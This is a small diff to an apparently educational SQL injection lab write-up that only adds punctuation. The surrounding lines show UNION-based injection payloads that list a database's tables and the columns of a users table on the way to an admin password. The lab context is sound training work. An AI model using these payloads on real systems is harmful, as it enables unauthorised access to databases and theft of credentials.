@@ -53,14 +53,14 @@ Since there were 2 columns, I injected:
 ```
 
 ### 4. Get admin's password  
-I injected   
+I injected:   
 ```text
 '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
 ```
 to get the list of the the table.  
 Among the returned table names, I identified the user table: **users_qkxziz**  
 
-Then, I injected  
+Then, I injected:  
 ```text
 '+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_qkxziz'--
 ```
